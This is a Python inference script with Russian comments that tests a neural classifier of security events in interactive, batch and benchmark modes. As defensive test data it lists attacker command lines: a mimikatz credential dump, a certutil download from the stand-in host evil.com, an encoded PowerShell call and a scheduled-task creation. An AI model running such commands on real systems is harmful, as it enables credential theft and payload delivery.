"""
Inference скрипт для тестирования обученной модели.

Использование:
    # Интерактивный режим
    python training/inference.py

    # Тест одного события
    python training/inference.py --event '{"command_line": "mimikatz.exe"}'

    # Тест файла с событиями
    python training/inference.py --file test_events.json

    # Benchmark
    python training/inference.py --benchmark
"""

import os
import sys
import json
import time
import argparse
from pathlib import Path

ROOT = Path(__file__).parent.parent
sys.path.insert(0, str(ROOT))

MODELS_DIR = ROOT / "training" / "models"

# Классы
EVENT_CLASSES = [
    "benign",
    "suspicious_low",
    "suspicious_medium",
    "malicious_high",
    "malicious_critical",
]


def load_model(model_path: str = None):
    """Загружает обученную модель."""
    try:
        from app.ml.neural_classifier import NeuralSecurityClassifier
    except ImportError:
        print("[ERROR] Не удалось импортировать NeuralSecurityClassifier")
        print("  Проверьте app/ml/neural_classifier.py")
        sys.exit(1)

    if model_path is None:
        # Ищем модель
        candidates = [
            MODELS_DIR / "neural_classifier_best.pt",
            MODELS_DIR / "neural_classifier.pt",
            ROOT / "models" / "neural_classifier.pt",
        ]
        for path in candidates:
            if path.exists():
                model_path = str(path)
                break

    if model_path is None or not Path(model_path).exists():
        print("[ERROR] Модель не найдена!")
        print("  Сначала обучите модель: python training/train.py")
        sys.exit(1)

    print(f"[LOAD] Загрузка модели: {model_path}")
    classifier = NeuralSecurityClassifier(model_path=model_path)
    print("[OK] Модель загружена")

    return classifier


def classify_event(classifier, event: dict) -> dict:
    """Классифицирует одно событие."""
    result = classifier.classify(event)
    return {
        "predicted_class": result.predicted_class,
        "confidence": round(result.confidence, 4),
        "probabilities": {
            cls: round(prob, 4)
            for cls, prob in zip(EVENT_CLASSES, result.probabilities)
        } if hasattr(result, 'probabilities') else {},
    }


def interactive_mode(classifier):
    """Интерактивный режим."""
    print("\n" + "=" * 70)
    print("ИНТЕРАКТИВНЫЙ РЕЖИМ")
    print("=" * 70)
    print("Введите события в формате JSON. 'q' для выхода.")
    print("Пример: {\"command_line\": \"mimikatz.exe sekurlsa::logonpasswords\"}")
    print()

    while True:
        try:
            user_input = input("Event> ").strip()
        except (KeyboardInterrupt, EOFError):
            print("\nВыход...")
            break

        if user_input.lower() in ('q', 'quit', 'exit'):
            break

        if not user_input:
            continue

        try:
            event = json.loads(user_input)
        except json.JSONDecodeError:
            # Пробуем как command_line
            event = {"command_line": user_input}

        result = classify_event(classifier, event)

        # Цветной вывод
        cls = result["predicted_class"]
        conf = result["confidence"]

        if "critical" in cls:
            color = "\033[91m"  # Красный
        elif "high" in cls:
            color = "\033[93m"  # Жёлтый
        elif "medium" in cls:
            color = "\033[94m"  # Синий
        elif "low" in cls:
            color = "\033[96m"  # Голубой
        else:
            color = "\033[92m"  # Зелёный

        print(f"  {color}[{cls}]{chr(27)}[0m confidence: {conf:.2%}")

        if result["probabilities"]:
            print("  Probabilities:")
            for cls_name, prob in sorted(result["probabilities"].items(), key=lambda x: -x[1]):
                bar = "█" * int(prob * 20)
                print(f"    {cls_name:20s}: {prob:.2%} {bar}")
        print()


def batch_mode(classifier, file_path: str):
    """Пакетный режим."""
    print(f"\n[LOAD] Загрузка событий из: {file_path}")

    with open(file_path, 'r', encoding='utf-8') as f:
        data = json.load(f)

    if isinstance(data, list):
        events = data
    elif isinstance(data, dict) and 'events' in data:
        events = data['events']
    else:
        events = [data]

    print(f"[OK] Загружено {len(events)} событий")
    print("\n" + "=" * 70)
    print("РЕЗУЛЬТАТЫ")
    print("=" * 70)

    results = []
    class_counts = {cls: 0 for cls in EVENT_CLASSES}

    for i, event in enumerate(events):
        result = classify_event(classifier, event)
        results.append(result)
        class_counts[result["predicted_class"]] += 1

        # Выводим краткую информацию
        cmdline = event.get("command_line", event.get("process_name", "unknown"))[:50]
        print(f"  [{i+1}] {result['predicted_class']:20s} ({result['confidence']:.2%}) - {cmdline}")

    # Статистика
    print("\n" + "=" * 70)
    print("СТАТИСТИКА")
    print("=" * 70)
    for cls in EVENT_CLASSES:
        count = class_counts[cls]
        pct = count / len(events) * 100
        bar = "█" * int(pct / 5)
        print(f"  {cls:20s}: {count:4d} ({pct:5.1f}%) {bar}")

    return results


def benchmark_mode(classifier, num_events: int = 1000):
    """Бенчмарк производительности."""
    print(f"\n[BENCHMARK] Тестирование на {num_events} событиях...")

    # Генерируем тестовые события
    import random
    test_events = []

    commands = [
        "notepad.exe document.txt",
        "powershell.exe -enc SGVsbG8gV29ybGQ=",
        "mimikatz.exe sekurlsa::logonpasswords",
        "cmd.exe /c dir c:\\users",
        "certutil.exe -urlcache -split -f http://evil.com/file",
        "schtasks.exe /create /tn task /tr cmd.exe",
    ]

    for _ in range(num_events):
        test_events.append({
            "event_id": random.choice([1, 4688, 4624]),
            "command_line": random.choice(commands),
            "process_name": commands[0].split()[0],
        })

    # Прогрев
    print("  Прогрев...")
    for event in test_events[:10]:
        classify_event(classifier, event)

    # Бенчмарк
    print("  Бенчмарк...")
    start = time.time()
    for event in test_events:
        classify_event(classifier, event)
    elapsed = time.time() - start

    events_per_sec = num_events / elapsed
    ms_per_event = elapsed / num_events * 1000

    print("\n" + "=" * 70)
    print("РЕЗУЛЬТАТЫ БЕНЧМАРКА")
    print("=" * 70)
    print(f"  События: {num_events}")
    print(f"  Время: {elapsed:.2f} сек")
    print(f"  Скорость: {events_per_sec:.0f} событий/сек")
    print(f"  Латентность: {ms_per_event:.2f} мс/событие")


def main():
    parser = argparse.ArgumentParser(description="Inference для обученной модели")
    parser.add_argument("--model", type=str, help="Путь к модели")
    parser.add_argument("--event", type=str, help="JSON события для классификации")
    parser.add_argument("--file", type=str, help="Файл с событиями")
    parser.add_argument("--benchmark", action="store_true", help="Бенчмарк")
    parser.add_argument("--benchmark-count", type=int, default=1000, help="Количество событий для бенчмарка")
    args = parser.parse_args()

    print("=" * 70)
    print("INFERENCE: НЕЙРОСЕТЕВОЙ КЛАССИФИКАТОР")
    print("=" * 70)

    # Загружаем модель
    classifier = load_model(args.model)

    # Режим работы
    if args.event:
        # Одно событие
        try:
            event = json.loads(args.event)
        except json.JSONDecodeError:
            event = {"command_line": args.event}

        result = classify_event(classifier, event)
        print("\n" + "=" * 70)
        print("РЕЗУЛЬТАТ")
        print("=" * 70)
        print(f"  Класс: {result['predicted_class']}")
        print(f"  Confidence: {result['confidence']:.2%}")
        if result['probabilities']:
            print("  Probabilities:")
            for cls, prob in sorted(result['probabilities'].items(), key=lambda x: -x[1]):
                print(f"    {cls}: {prob:.2%}")

    elif args.file:
        # Пакетный режим
        batch_mode(classifier, args.file)

    elif args.benchmark:
        # Бенчмарк
        benchmark_mode(classifier, args.benchmark_count)

    else:
        # Интерактивный режим
        interactive_mode(classifier)


if __name__ == "__main__":
    main()
